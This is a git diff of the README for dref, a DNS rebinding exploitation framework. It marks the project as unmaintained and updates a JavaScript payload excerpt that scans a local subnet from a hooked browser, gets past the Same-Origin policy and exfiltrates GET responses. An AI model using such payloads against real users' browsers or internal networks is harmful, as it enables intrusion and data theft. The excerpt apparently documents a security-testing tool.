@@ -3,18 +3,6 @@
     <img src="https://raw.githubusercontent.com/mwrlabs/dref/master/docs/img/logo.png">
   </p>
 
-  <!-- REPLACE SHIELDS -->
-  <p align="center">
-    <img src="https://travis-ci.com/mwrlabs/dref.svg?branch=master">
-    <img src="https://codecov.io/gh/mwrlabs/dref/branch/master/graph/badge.svg">
-    <a href="https://greenkeeper.io/">
-      <img src="https://badges.greenkeeper.io/serain/netmap.js.svg">
-    </a>
-    <a href="https://gitter.im/dref/Lobby/">
-      <img src="http://badges.gitter.im/serain/dref.svg">
-    </a>
-  </p>
-
   <p align="center">DNS Rebinding Exploitation Framework</p>
 
   <p align="center">
@@ -22,7 +10,9 @@
   </p>
 </dl>
 
-dref does the heavy-lifting for [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). The following snippet from one of its [default payloads](https://github.com/mwrlabs/dref/wiki/Payloads#web-discover) shows the framework being used to scan a local subnet from a hooked browser; after identifying live web services it proceeds to exfiltrate GET responses, [breezing through the Same-Origin policy](https://github.com/mwrlabs/dref/wiki#limitations):
+This project is no longer maintained.
+
+dref does the heavy-lifting for [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). The following snippet from one of its [built-in payloads](https://github.com/mwrlabs/dref/wiki/Payloads#web-discover) shows the framework being used to scan a local subnet from a hooked browser; after identifying live web services it proceeds to exfiltrate GET responses, [breezing through the Same-Origin policy](https://github.com/mwrlabs/dref/wiki#limitations):
 
 ```javascript
 // mainFrame() runs first
@@ -46,9 +36,11 @@ function rebindFrame () {
   // After this we'll have bypassed the Same-Origin policy
   session.triggerRebind().then(() => {
     // We can now read the response across origin...
-    network.get(session.baseURL, (code, headers, body) => {
-      // ... and exfiltrate it
-      session.log({code: code, headers: headers, body: body})
+    network.get(session.baseURL, {
+      successCb: (code, headers, body) => {
+        // ... and exfiltrate it
+        session.log({code: code, headers: headers, body: body})
+      }
     })
   })
 }
